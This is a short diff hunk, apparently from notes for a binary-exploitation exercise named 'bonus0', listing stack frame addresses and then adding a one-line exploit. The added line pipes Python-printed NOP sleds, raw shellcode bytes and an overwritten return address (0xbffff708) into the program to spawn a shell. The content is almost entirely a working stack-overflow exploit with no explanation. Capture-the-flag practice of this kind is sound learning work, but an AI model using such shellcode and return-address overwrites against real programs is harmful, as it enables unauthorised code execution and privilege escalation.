@@ -12,3 +12,7 @@ dans pp -> base pointer 0xbffff6e8
 	eip at 0xbffff6ec = 0x080485b9 (ebp+4)
 	address v0 0xbffff706
 dans main -> base pointer 0xbffff738
+
+
+(python -c 'print "\x90"*3 + "\x8B\x44\x24\x04\x8B\x40\x04\x89\x04\x24\xB8\x60\xA0\x17\x00\xFF\xD0"' && python -c 'print "\x90"*14 + "\x08\xf7\xff\xbf" + "\x90" + "\n"' ; cat) | ./bonus0 /bin/sh
+
